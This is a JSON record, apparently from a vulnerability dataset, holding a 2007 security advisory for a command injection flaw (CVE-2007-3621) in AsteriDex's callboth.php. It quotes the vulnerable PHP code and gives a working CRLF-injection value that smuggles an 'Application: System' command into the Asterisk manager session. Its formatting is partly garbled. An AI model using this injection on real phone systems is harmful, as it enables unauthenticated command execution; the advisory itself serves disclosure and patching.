{
    "text": "vul_name : AsteriDex ( Asterisk / Trixbox ) remote code execution ， vul_cve : CVE-2007-3621 ， vul_poc : _ ， _ ， Hoku Security ， Vulnerability Advisory ， _ ， _ ， Title : AsteriDex remote command execution ， Vendor URL :  ， Type : Command injection / remote code execution ， Vulnerable ， versions : <= 3.0 ， Risk factor : High ， Popularity : Low ， Author : Carl Livitt ， Contact : carl ( at ) hoku.co ( dot ) uk [ email concealed ]  ， Date : 25th June , 2007 ， Location :  ， _ ， _ ， Description :  ， AsteriDex is a digital rolodex for Asterisk / Trixbox PBXs. There is a ， command injection vulnerability which allows unauthenticated users to ， execute arbitrary commands on the Asterisk management console. Such ， access permits execution of arbitrary operating system commands as the ， 'asterisk' user. ， The software is vulnerable in its default configuration. ， _ ， _ ， Details :  ， The script 'callboth.php' is used by AsteriDex to bridge a VOIP call ， between two end-points. Insufficient parameter checking is done on the ， variables IN and OUT , allowing a malicious user to inject arbitrary ， commands into the Asterisk management console. ， The script works by logging into the console server on port 5038/TCP ， on localhost. It then issues an 'Action : Originate' command which is ， used to setup the bridged call. The relevant code from callboth.php is :  ， fputs (  $ fp , \"Action : loginrn\" )  ;  ， fputs (  $ fp , \"Username : phpagirn\" )  ;  ， fputs (  $ fp , \"Secret : phpagirn\" )  ;  ， fputs (  $ fp , \"Events : offrnrn\" )  ;  ， sleep ( 1 )  ;  ， fputs (  $ fp , \"Action : Originatern\" )  ;  ， fputs (  $ fp , \"Channel :  $ INrn\" )  ; Command injection ， fputs (  $ fp , \"Context : custom-callbothrn\" )  ;  ， fputs (  $ fp , \"Exten :  $ OUTrn\" )  ; Command injection ， fputs (  $ fp , \"Priority : 1rnrn\" )  ;  ，  $ IN is set from $ _GET [ 'IN' ] with no sanity checking other than a test of ， string length ; all strings passed to $ IN must be less than 100 chars ,  ， including the string 'sip/' which is prepended to $ IN prior to the length ， check. ， Given sane values of $ IN=123 ,  $ out=321 and $ CallerID=567 , the session would ， look like this :  ， Action : login ， Username : phpagi ， Secret : phpagi ， Events : off ， Action : Originate ， Channel : 123 ， Context : custom-callboth ， Exten : 321 ， Priority : 1 ， By including CRLF characters in $ IN , an attacker can inject arbitrary ， commands into the data stream , hijacking the authenticated session to run ， commands of the attackers choice. Take , for example , a $ IN string containing :  ， 190 ( at ) example ( dot ) com [ email concealed ] rnApplication : SystemrnData : echo pwn3d > /tmp/hoku.txtrn ， This would transform the session into :  ， Action : login ， Username : phpagi ， Secret : phpagi ， Events : off ， Action : Originate ， Channel : 190 ( at ) example ( dot ) com [ email concealed ]  ， Application : System ， Data : echo pwn3d > /tmp/hoku.txt ， Context : custom-callboth ， Exten : 321 ， Priority : 1 ， This would use the call manager's 'System' functionality to execute user- ， supplied operating system commands , in this case writing the word \"pwn3d\" to a ， file called \"/tmp/hoku.txt\". The rest of the session would fail because the ， attacker has subverted the original 'Action' , rendering the remaining commands ， meaningless to the manager. ， _ ， _ ， Updated Versions :  ， A patched version of AsteriDex is available from :  ， _ ， _",
    "time": "2007.07.10"
}